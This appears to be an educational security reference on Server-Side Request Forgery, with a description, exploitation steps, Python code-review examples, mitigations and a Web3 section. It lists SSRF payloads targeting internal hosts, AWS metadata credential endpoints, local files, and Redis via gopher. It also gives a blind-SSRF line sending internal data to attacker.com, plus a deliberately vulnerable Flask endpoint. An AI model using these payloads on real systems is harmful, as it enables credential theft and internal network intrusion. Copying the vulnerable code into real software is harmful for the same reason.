## 🧠 Description

- **What it is (in simple terms):** Server-Side Request Forgery (SSRF) is a web security vulnerability where an attacker tricks a web server into making requests to an unintended location. Essentially, the server acts as a proxy for the attacker.
    
- **What it is (technical explanation):** SSRF occurs when a web application processes a URL or request parameter provided by a user, but fails to properly validate or filter that input before using it to fetch data from another resource. The server then constructs and sends an arbitrary or partially controlled request (e.g., HTTP, FTP, Gopher, File) from its own backend to an address specified by the attacker, potentially bypassing firewalls, accessing internal systems, or querying cloud metadata services.
    
- **Where it occurs (context):**
    
    - **Backend/API:** This vulnerability almost exclusively occurs on the server-side, within the backend logic of web applications or APIs.
        
    - **Common scenarios:** Image/file upload services that fetch from URLs, PDF generators that render external content, webhooks, URL shorteners, data import features that fetch data from external sources, proxy services, or integrations with third-party APIs.
        
- **Root cause:** The fundamental root cause of SSRF is **unvalidated or insufficiently validated user-supplied input** that is subsequently used to construct and initiate server-side network requests. The application trusts that the provided URL or endpoint is benign without proper checks.
    
- **The different types:**
    
    - **Basic/Regular SSRF:** The attacker receives a direct response from the server-side request (e.g., the content of an internal page, data from a metadata service).
        
    - **Blind SSRF:** The attacker does not receive the direct response from the server-side request in the application's response. Exploitation involves out-of-band techniques (e.g., making the server send a request to an attacker-controlled server, causing DNS lookups, or triggering external services that leave a trace). This type often requires more advanced techniques to confirm and extract information.
        

## 🧪 Exploitation Techniques

- **Step-by-step walkthrough of how it’s exploited:**
    
    1. **Identify a vulnerable parameter:** An attacker finds an input field, URL parameter, or JSON/XML field that accepts a URL (e.g., `image_url`, `callback_url`, `pdf_source`, `xml_feed`).
        
    2. **Craft a malicious URL:** The attacker replaces the expected external URL with an internal IP address or an internal service endpoint.
        
    3. **Server makes the request:** The vulnerable server, without proper validation, attempts to fetch the content from the attacker-supplied internal URL.
        
    4. **Information Leakage/Action:**
        
        - **Internal Network Access:** The server might expose internal services (e.g., admin panels, databases, internal APIs) that are not directly accessible from the internet.
            
        - **Cloud Metadata Services:** Servers in cloud environments (AWS EC2, GCP, Azure) often expose local metadata endpoints (`http://169.254.169.254` for AWS) that provide sensitive information (IAM roles, temporary credentials, instance details).
            
        - **Port Scanning:** By iterating through internal IP addresses and ports, an attacker can map out the internal network's services.
            
        - **Scheme Abuse:** Using `file:///` to read local files, `gopher://` to interact with internal services like Redis, FastCGI, or databases, or `ftp://`/`smb://` to interact with file shares.
            
        - **Firewall Bypass:** The server can bypass firewall rules that restrict direct access from the internet to internal systems, as the request originates from within the trusted internal network.
            
- **Payload examples (categorized by target/schema):**
    
    - **Internal Web Servers/APIs:**
        
        - `http://localhost/admin`
            
        - `http://127.0.0.1/dashboard`
            
        - `http://192.168.1.100/api/users`
            
    - **Cloud Metadata Services (AWS EC2):**
        
        - `http://169.254.169.254/latest/meta-data/`
            
        - `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
            
        - `http://169.254.169.254/latest/dynamic/instance-identity/document`
            
    - **Local File Inclusion (using `file://` scheme):**
        
        - `file:///etc/passwd` (Linux)
            
        - `file:///C:/Windows/System32/drivers/etc/hosts` (Windows)
            
    - **Port Scanning:**
        
        - `http://localhost:22` (If the server tries to connect, a connection error might indicate the port is open, or a timeout for a closed port)
            
        - `http://127.0.0.1:8080/`
            
    - **Gopher Protocol Abuse (e.g., for Redis interaction):**
        
        - `gopher://localhost:6379/_*1%0D%0A$4%0D%0AINFO%0D%0A` (Basic Redis INFO command)
            
        - More complex gopher payloads can interact with FastCGI, SQL databases, etc., by crafting raw TCP requests.
            
    - **Blind SSRF (out-of-band interaction):**
        
        - `http://attacker.com/log?data=internal_info` (server fetches attacker's URL, sending internal info in query string)
            
        - `http://attacker.burpcollaborator.net/` (triggers a DNS lookup and HTTP request to Burp Collaborator, confirming the SSRF)
            
- **Tools used:**
    
    - **Burp Suite (especially Burp Collaborator):** Essential for detecting blind SSRF and for crafting/testing payloads.
        
    - **`curl`:** For manual testing of HTTP/S requests from your machine to identify potential SSRF parameters.
        
    - **`nmap`:** While `nmap` itself isn't used to _exploit_ SSRF, the _concept_ of port scanning is often what an attacker tries to achieve _via_ SSRF to map internal networks.
        
    - **Custom scripts:** To automate port scanning or payload generation via the vulnerable endpoint.
        
- **Real-world examples (conceptual):**
    
    - **Cloud Metadata Service Compromise:** A very common and impactful scenario where an SSRF allows an attacker to steal temporary cloud credentials, leading to full control over cloud resources. Many public bug bounty reports detail this.
        
    - **Vulnerabilities in URL parsing libraries:** Bugs in libraries responsible for parsing URLs can sometimes be exploited to bypass SSRF protections.
        
    - **Legacy internal services:** Often, internal applications run old, unpatched versions of software that are highly vulnerable if exposed via SSRF, even if the public-facing application is patched.
        

## 🔎 Code Review Tips

- **What patterns or red flags to look for:**
    
    - Any code that accepts a URL, hostname, IP address, or file path as user input.
        
    - Functions that fetch content from external sources (e.g., `http.get()`, `urllib.request.urlopen()`, `curl`, `file_get_contents`, `Image.open(url)`).
        
    - Proxy functionalities or redirection logic.
        
    - Services that process external XML/JSON feeds or files specified by URL.
        
    - Anywhere content is generated (e.g., PDF reports) from a user-supplied URL.
        
- **Bad vs good code examples (Python):**
    
    ```python
    # BAD: Direct use of user input in URL fetching
    import requests
    from flask import Flask, request
    
    app = Flask(__name__)
    
    @app.route('/fetch_image')
    def fetch_image():
        image_url = request.args.get('url')
        if not image_url:
            return "Please provide a 'url' parameter."
        try:
            # VULNERABLE: No validation on image_url
            response = requests.get(image_url, timeout=5)
            # Potentially serve image, or just return success
            return f"Fetched content length: {len(response.content)}"
        except requests.exceptions.RequestException as e:
            return f"Error fetching URL: {e}", 500
    
    # GOOD: Input validation and whitelisting/blocking
    import requests
    from flask import Flask, request
    from urllib.parse import urlparse
    
    app = Flask(__name__)
    
    # Whitelist for allowed domains (preferred)
    ALLOWED_DOMAINS = ['example.com', 'trusted-cdn.com']
    # Blacklist for disallowed IP ranges (less secure, but a layer)
    DISALLOWED_IP_RANGES = ['127.0.0.1', '10.0.0.0/8', '172.16.0.0/12', '192.168.0.0/16', '169.254.169.254'] # etc.
    
    @app.route('/safe_fetch_image')
    def safe_fetch_image():
        image_url = request.args.get('url')
        if not image_url:
            return "Please provide a 'url' parameter."
    
        parsed_url = urlparse(image_url)
    
        # 1. Scheme Validation: Only allow HTTP/HTTPS
        if parsed_url.scheme not in ['http', 'https']:
            return "Invalid URL scheme. Only HTTP and HTTPS are allowed.", 400
    
        # 2. Domain Whitelisting: Only allow specific external domains
        if parsed_url.netloc not in ALLOWED_DOMAINS:
            return "Domain not allowed.", 403
    
        # 3. Prevent IP usage (to stop direct internal IP access attempts)
        # This is basic; a full solution needs to resolve hostname to IP and check that.
        if parsed_url.hostname and (
            parsed_url.hostname.startswith('127.') or
            parsed_url.hostname.startswith('10.') or
            parsed_url.hostname.startswith('172.16.') # etc.
        ):
             return "Access to private IP ranges is disallowed directly.", 403
    
        # 4. Use a timeout to prevent DoS/long connections
        try:
            response = requests.get(image_url, timeout=5)
            return f"Fetched content length: {len(response.content)}"
        except requests.exceptions.RequestException as e:
            return f"Error fetching URL: {e}", 500
    
    ```
    
- **What functions/APIs are often involved:**
    
    - **Python:** `requests.get()`, `urllib.request.urlopen()`, `httplib`, `aiohttp`, `xml.etree.ElementTree.parse()` (when fetching DTDs via URL).
        
    - **Java:** `java.net.URL.openConnection()`, `java.net.HttpURLConnection`, `Apache HttpClient`, `OkHttp`, `JAXB`, `SAXBuilder` (for external entities).
        
    - **Node.js:** `http.get()`, `https.get()`, `node-fetch`, `axios`.
        
    - **PHP:** `file_get_contents()`, `curl_exec()`, `fsockopen()`.
        
    - **Ruby:** `open()`, `Net::HTTP`.
        
- **Where in the app codebase you'd usually find this:**
    
    - **Controllers/Routes:** Endpoints that accept URLs as parameters.
        
    - **Helper Libraries/Utility Functions:** Functions responsible for fetching external data.
        
    - **Third-party Integrations:** Code dealing with webhooks, image/video embeds, content syndication.
        
    - **Configuration Files:** If URLs are loaded from dynamic configs that user can influence.
        

## 🛡️ Mitigation Strategies

- **Input validation/sanitization (most critical):**
    
    - **Whitelisting is paramount:** Define a strict whitelist of allowed URL schemes (e.g., `http`, `https` only), specific domains, or even specific full URLs that the application is allowed to fetch. Reject anything not on the whitelist.
        
    - **Never rely on blacklists:** Blacklisting IP ranges (like 127.0.0.1, private IPs) is prone to bypasses (e.g., decimal-to-hex conversion, DNS rebinding, 30x redirects).
        
    - **URL Parsing and Normalization:** Always parse the URL comprehensively (scheme, hostname, port, path) and normalize it _before_ validation. Use robust URL parsing libraries.
        
    - **Resolve hostnames to IPs:** Before making the request, resolve the hostname to its actual IP address(es) and ensure _none_ of the resolved IPs fall into private or disallowed ranges. This is critical for preventing DNS rebinding attacks.
        
    - **Restrict URL schemes:** Explicitly disallow dangerous schemes like `file://`, `gopher://`, `ftp://`, `data://`, etc., unless absolutely required and thoroughly vetted.
        
    - **Disable redirects:** Configure the HTTP client to explicitly disable automatic redirects, or at least validate the redirected URL against the same SSRF checks. Attackers can use redirects to bypass initial validation.
        
- **Encoding/escaping best practices:**
    
    - While not a primary defense _against_ SSRF itself, proper URL encoding of _components_ within a URL (e.g., query parameters, path segments) is important for preventing other types of injection or misinterpretation if those components also contain user input. The core defense for SSRF remains validation of the _entire_ URL.
        
- **Framework-specific protections:**
    
    - Many modern frameworks (e.g., Django, Spring Security, Flask-SeaSurf) provide built-in CSRF protection, but **CSRF is different from SSRF**. Some frameworks might offer basic URL validation helpers, but often custom implementation is required for robust SSRF protection.
        
    - Always use built-in, well-maintained HTTP client libraries rather than rolling your own, and understand their security implications (e.g., default redirect handling).
        
- **Secure configurations (headers, CSPs, etc.):**
    
    - **Network Segmentation/Firewalls:** Implement strong network segmentation. The web server should be in a DMZ and have outbound firewall rules that only permit connections to explicitly necessary external resources (e.g., specific payment gateways, CDNs). Block outbound connections to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, loopback 127.0.0.1, link-local 169.254.0.0/16).
        
    - **Least Privilege:** Run the web application with the lowest possible privileges necessary to function.
        
    - **No unnecessary services:** Disable or remove any unnecessary internal services or APIs that a compromised web server could exploit.
        
- **Defense-in-depth:**
    
    - Combine rigorous input validation, hostname resolution to IP blacklisting (as a secondary check, not primary), strict outbound firewall rules, and a principle of least privilege for the application and its environment. No single control is foolproof.
        

## 🔐 Blockchain Context

SSRF does not directly apply to smart contracts themselves, as smart contracts execute on a blockchain and cannot directly make outbound HTTP/network requests to external servers or internal networks. They are deterministic and sandboxed.

However, the _concept_ of an application making a request based on untrusted input is highly relevant for **off-chain components** within the Web3 ecosystem that interact with smart contracts or external systems.

- **How this vuln appears in Web3-related components:**
    
    - **Oracles:** If an oracle service fetches real-world data based on a URL provided by a user (e.g., in a smart contract call that triggers an oracle), and that oracle is vulnerable to SSRF, an attacker could force the oracle's backend to query internal infrastructure or sensitive data sources. For example, a "decentralized" price feed oracle that fetches prices from a user-specified exchange API URL could be exploited if the URL is not validated.
        
    - **Relayers/Backend Services for DApps:** Many decentralized applications (dApps) have a centralized backend component (a "relayer," or just the dApp's server) that performs actions like:
        
        - Indexing blockchain data.
            
        - Fetching off-chain metadata (e.g., for NFTs from IPFS or other content addresses).
            
        - Submitting transactions to the blockchain on behalf of users.
            
        - Providing API endpoints for the frontend of the dApp. If any of these backend services accept user-controlled URLs for fetching data, they could be vulnerable to SSRF. For instance, an NFT marketplace backend that fetches image previews for NFTs from an arbitrary URL could be coerced into an SSRF.
            
    - **Web3 Storage Integrations:** Services that allow users to store or retrieve data from decentralized storage solutions (like IPFS, Arweave) might have a backend component that translates traditional HTTP requests to these services. If the content address or gateway URL is user-controlled and unvalidated, SSRF could occur.
        
- **Web3-specific risks (e.g., RPC abuse, signing UI attacks):**
    
    - **RPC Abuse (indirect):** While SSRF doesn't directly target RPC endpoints in the same way it targets HTTP, if a dApp's backend has an SSRF vulnerability, an attacker _could_ potentially force that backend to make requests to internal (or external, but unintended) RPC endpoints. This could lead to a denial of service on those endpoints or, in rare cases of misconfigured RPCs, unintended interactions.
        
    - **No direct signing UI attacks via SSRF:** SSRF primarily affects server-to-server communication. Signing UI attacks (where a user is tricked into signing a malicious transaction via their wallet) are client-side vulnerabilities, typically related to phishing or malicious dApp code, not SSRF.